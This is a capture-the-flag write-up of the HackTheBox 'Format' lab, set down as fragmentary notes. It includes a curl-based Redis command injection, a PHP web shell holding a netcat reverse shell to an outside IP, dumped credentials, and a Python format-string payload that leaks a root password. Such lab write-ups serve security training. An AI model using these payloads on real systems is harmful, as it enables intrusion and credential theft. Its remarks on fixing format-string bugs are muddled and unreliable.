# HackTheBox — Format

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Tags: redis-injection, php-rce, python-format-string](https://img.shields.io/badge/Tags-Redis%20Injection%20%7C%20PHP%20RCE%20%7C%20Python%20Format%20String-orange)

> 🚧 **[fragmentary — original is bullet-style notes; key payloads and creds preserved, narrative needs filling]**

---

## Attack Chain at a Glance

```
🚧 [recon — nmap not in notes]
   → web app (microblog.htb) registration → cooper:zooperdoopercooper
   → bypass "Pro/Upload" check via Redis HSET injection (path-based)
   → upload PHP reverse shell to /a/uploads/rev.php → RCE as www-data
   → redis-cli on /var/run/redis/redis.sock → dump cooper.dooper hash
   → SSH as cooper:zooperdoopercooper
   → user.txt
   → sudo -l: cooper can run /usr/bin/license as root (Python script)
   → Python format-string injection via username field in Redis
   → leak `secret` global from license.__init__.__globals__
   → SSH as root:unCR4ckaBL3Pa$$w0rd → root.txt
```

---

## Reconnaissance

> 🚧 **[incomplete]** — no nmap captured. Box hostname is `microblog.htb` / `format.htb`.

---

## Initial Foothold

### Credentials

```
ssh cooper:zooperdoopercooper
```

> 🚧 **[gap]** — how `cooper`'s creds were obtained (likely via the registration path documented below).

### "Pro" Bypass via Redis Path Injection

The application uses Redis with PHP, served via a path-based proxy. The static-asset path can be manipulated to inject Redis commands:

```bash
curl -X "HSET" 'http://microblog.htb/static/unix:/var/run/redis/redis.sock:a%20pro%20true%20/a'
```

This flips the `pro` flag for user `a` to `true`, unlocking the upload feature.

### Reverse Shell Upload

A POST to `/edit/index.php` with a header field that injects PHP into the rendered page:

```
id=/var/www/microblog/a/uploads/rev.php&header=<%3fphp+echo+shell_exec("rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.153%20443%20%3E%2Ftmp%2Ff")%3B%3f>
```

URL-decoded payload:

```php
<?php echo shell_exec("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.153 443 >/tmp/f"); ?>
```

Visit `/a/uploads/rev.php` to trigger; catch with `nc -lvnp 443`.

### Dumping Redis

From the `www-data` shell, the Redis socket is locally accessible:

```bash
redis-cli -s /var/run/redis/redis.sock
```

```
> select 0
OK
> keys *
cooper.dooper:sites
cooper.dooper
PHPREDIS_SESSION:8oghsg6rbaaqivhoaeo99qa5rb
a
a:sites
> hgetall cooper.dooper
username       cooper.dooper
password       zooperdoopercooper
first-name     Cooper
last-name      Dooper
pro            false
```

---

## User Flag

```bash
ssh cooper@format.htb
# password: zooperdoopercooper
cat ~/user.txt
```

🚩 **User flag captured.**

---

## Privilege Escalation — Python Format String Disclosure

### Sudo Rule

```
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
```

`/usr/bin/license` is a Python script (`microblog license key manager`) that reads user records from Redis and runs them through `str.format()` — a classic Python format-string injection sink.

### Injecting `{license.__init__.__globals__}`

Set a username in Redis with a format-string payload:

```bash
redis-cli -s /var/run/redis/redis.sock
> hset a username {license.__init__.__globals__}
```

Run the license utility against that user:

```bash
sudo /usr/bin/license -p a
```

The script renders the username into the output, which causes Python's format machinery to dereference `license.__init__.__globals__` — leaking the entire module globals dict, including:

```python
'secret': 'unCR4ckaBL3Pa$$w0rd'
```

> 💡 **Why this works:** `"hello {x}".format(x=user_obj)` lets `x` be any object — and `{x.attr}` walks attributes. Python's `__init__.__globals__` is the dict of every module-level name in the script. If user-controlled data lands inside the format template (not as a `{0}`/`{}` argument), an attacker can read any global the script imported or defined.

### SSH as Root

```bash
ssh root@microblog.htb
# password: unCR4ckaBL3Pa$$w0rd
```

---

## Root Flag

> 🚧 **[incomplete]** — flag value not in original notes.

---

## Lessons Learned

- **Path injection into Redis sockets is a real class.** When a web app proxies static-asset paths into a Redis-backed service via Unix sockets, `unix:/path/socket:CMD args` syntax can smuggle Redis commands into requests.
- **`str.format()` with user-controlled templates is exploitable.** The fix is `f"{value!s}"` or pre-escaping `{` and `}`. If you ever see `someuser_input.format(...)` or `f"{user_input}"` (the latter is fine; the former is the bug), look for attribute traversal payloads.
- **`__init__.__globals__` is the universal Python script secret-leak.** It exposes every imported module, every global variable, and every constant the script defined.
- **Redis with no auth on a Unix socket is shared-tenant access** — anyone who can reach the socket (which means anyone running as `www-data` on the same host) is a Redis admin.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`redis-cli`](https://redis.io/docs/ui/cli/) | Direct Redis access via the Unix socket |
| [Python format-string injection writeup (PortSwigger)](https://portswigger.net/research/server-side-template-injection-with-jinja2) | Background on format-string disclosure (Jinja2 cousin of the same primitive) |
